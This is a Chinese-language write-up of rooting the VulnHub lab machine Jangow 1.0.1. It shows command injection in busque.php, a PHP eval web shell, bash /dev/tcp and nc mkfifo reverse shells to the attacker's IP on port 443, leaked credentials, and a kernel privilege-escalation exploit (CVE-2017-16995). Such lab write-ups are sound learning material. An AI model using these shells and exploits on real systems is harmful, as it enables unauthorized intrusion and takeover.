---
title: Jangow-1-01
author: Creexile
date: 2024-10-19 21:58:47
lastMod: 2025-04-10
summary: 'No.11'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [提权, 漏洞利用, 渗透]
---

# jangow: 1.0.1

---

No.11

> 来源: [vulnhub靶场-Jangow: 1.0.1](https://www.vulnhub.com/entry/jangow-101,754/)
>
> 目标: 没说, get root吧
>
> 还是比较简单的靶机, 唯一难受的就是网络配置问题了

## 环境配置

kali: 192.168.110.130

target: 192.168.110.131

> 注意此处可能会存在网络问题, 这里就不再给出解决办法
>
> 该靶机被笔者用于测试别的功能, 所以环境可能不太一样

## 信息收集

```bash
nmap -sS 192.168.110.0/24
```

开放端口21, 80

访问之后在`192.168.110.131/site/`找到一个类似博客的地方, 其中在`http://192.168.110.131/site/busque.php?buscar=`处发现似乎是一个注入点

测试得到可以进行RCE:

![image-20241019195039215](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019195039215.png)

## getshell

可以写shell, 也可以直接反弹shell, 这里选择了写shell然后蚁剑连接

```bash
echo '<?php @eval($_POST[1]); ?>' > shell1.php
```

![image-20241019195418116](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019195418116.png)

反弹shell可以用php重新写一个文件用来反弹shell, 这里直接用的命令执行

除了443端口 似乎都反弹不出去

```bash
# RCE反弹
bash -c 'bash -i >& /dev/tcp/192.168.110.130/443 0>&1'
# php反弹
<?php system("mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.130 443 >/tmp/f");?>
```

![image-20241019200554300](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019200554300.png)

## 信息收集

```bash
uname -a
# Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
gcc -v
```

在`/var/www/html/site/wordpress`下有配置文件, 给了mysql的账密`desafio02 : abygurl69`

只能用于登录ftp, 但是ftp也拿不到东西

在`/var/www/html/.backup`中找到新的账密, `jamgow01 : abygurl69`

## 提权

已知版本为 4.4.0-31-generic 的 Ubuntu

![image-20241019214740861](C:/Users/CAO/AppData/Roaming/Typora/typora-user-images/image-20241019214740861.png)

对应漏洞为`CVE-2017-16995`

```bash
locate linux/local/45010.c
cp /usr/share/exploitdb/exploits/linux/local/45010.c ~/Desktop
# 是非root情况
```

然后用蚁剑上传到靶机, 当然用python开一个http服务也行

```bash
chmod 777 45010.c
gcc 45010.c -o exp
chmod 777 exp
./exp
```

执行命令编译出来的文件即可, 成功提权

![image-20241019215539082](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019215539082.png)
